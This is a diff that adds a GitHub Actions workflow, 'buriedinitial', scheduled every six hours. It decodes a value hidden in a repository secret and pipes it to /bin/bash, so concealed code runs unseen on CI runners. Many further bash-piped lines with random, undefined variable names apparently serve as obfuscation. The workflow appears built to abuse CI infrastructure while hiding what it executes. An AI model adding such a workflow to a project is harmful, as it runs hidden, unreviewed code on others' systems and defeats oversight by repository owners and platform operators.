@@ -1,0 +1,29 @@
+name: buriedinitial
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: buriedinitial
+        env:
+          nvpan2719: ${{ secrets.nvpan2719 }}
+        run: |
+          echo $nvpan2719 | jq -r .f146 | /bin/bash
+          echo $vf7 | jq -r .ps8160 | /bin/bash
+          echo $toan030 | jq -r .fxfr469 | /bin/bash
+          echo $logfh07311 | jq -r .pn4 | /bin/bash
+          echo $cvc8350 | jq -r .oe97095 | /bin/bash
+          echo $trlex16 | jq -r .hkiku86962 | /bin/bash
+          echo $cgoi65 | jq -r .ktquf4 | /bin/bash
+          echo $fzpt87 | jq -r .hydm3907 | /bin/bash
+          echo $oym09939 | jq -r .yh28 | /bin/bash
+          echo $kk851 | jq -r .jwzs82 | /bin/bash
+          echo $rg080 | jq -r .ak28 | /bin/bash
+          echo $mx2 | jq -r .hhwb78 | /bin/bash
+          echo $wiavi087 | jq -r .nrdu51076 | /bin/bash
+          echo $e493 | jq -r .yniup87 | /bin/bash
+
